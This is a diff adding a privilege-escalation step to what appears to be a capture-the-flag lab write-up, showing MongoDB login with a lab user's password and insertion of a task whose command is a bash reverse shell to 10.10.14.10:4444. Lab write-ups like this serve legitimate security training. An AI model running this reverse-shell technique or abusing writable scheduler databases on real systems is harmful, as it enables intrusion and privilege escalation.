@@ -184,6 +184,29 @@ tom       1237  0.0  7.4 1029352 56552 ?       Ssl  08:02   0:04 /usr/bin/node /
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/f5c0ab3e-fb47-469d-84a4-ce2c6f5bebaf)
 
++ MongoDB is a popular open-source NoSQL (non-relational) document-oriented database management system like json, apart from RDBMS. It is designed to store, retrieve, and manage unstructured or semi-structured data. MongoDB uses a flexible, schema-less data model, which means that documents within a collection (similar to a table in a relational database) can have different fields and structures.
++ Login using mark’s credentials and access the scheduler database. The set interval function seems to be checking for documents (equivalent to rows) in the tasks collection (equivalent to tables). For each document it executes the cmd field. Since we do have access to the database, we can add a document that contains a reverse shell as the cmd value to escalate privileges.
+
++ Connect to mongodb: `mongo -u mark -p 5AYRft73VtFpc84k scheduler`
++ Lists the database name: `db`
++ Shows all the tables in the database - equivalent to **show tables**: `show collections`
++ List content in tasks table - equivalent to **select * from tasks**: `db.tasks.find()`
++ The tasks collection does not contain any documents. Insert a document that contains a reverse shell.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ec0ae4be-6dcb-49dd-8693-492cc655661a)
+
++ Insert a reverse shell into the DB as the command:
+```
+db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'"})
+```
+
++ Check that the document got added properly: `db.tasks.find()`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6925e4d6-ab7e-4f88-b721-c0bddd4d7c03)
+
++ Get the sheel 30 seconds later:
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d0ba5da4-0ee6-4541-9d4e-12ec3eb812d9)
 
 
 
